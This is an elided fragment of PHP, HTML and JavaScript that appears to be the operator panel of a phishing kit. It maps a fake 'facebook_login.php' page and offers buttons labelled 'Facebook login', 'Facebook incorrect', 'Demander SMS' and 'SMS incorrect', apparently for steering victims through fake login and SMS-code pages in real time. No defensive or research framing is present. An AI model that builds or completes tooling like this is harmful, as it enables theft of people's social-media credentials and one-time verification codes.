...
function getPageName($page) {
    $pageNames = [
        ...
        'facebook_login.php' => 'Connexion Facebook',
...
function getPageIcon($page) {
    $pageIcons = [
        ...
        'facebook_login.php' => 'fab fa-facebook-f',
...
<head>
  ...
  color: #fff;
        ...
        .action-btn[data-action="facebook_login"] {
            background-color: #1877f2;
            color: white;
        }
        
        .action-btn[data-action="facebook_login"]:hover {
        ...
        <div class="card">
            ...
            <div class="card-body">
                ...
                <div class="action-buttons">
                    <button class="action-btn" data-action="facebook_login">
                    <i class="fab fa-facebook-f"></i> Facebook login
                    </button>
                    <button class="action-btn" data-action="facebook_error">
                    <i class="fab fa-facebook-f"></i> Facebook incorrect
                    </button>
                    ...
                    <button class="action-btn" data-action="redirect" data-page="sms_verification">
                        <i class="fas fa-sms"></i> Demander SMS
                    </button>
                    <button class="action-btn" data-action="sms_error">
                        <i class="fas fa-exclamation-circle"></i> SMS incorrect
                    </button>
...
document.querySelectorAll('.action-btn').forEach(button => {
    button.addEventListener('click', function() {
        ...
        console.log(currentPage);
            ...
            if (action === 'facebook_error' && currentPage !== 'facebook_login.php' && currentPage !== 'loading.php') {
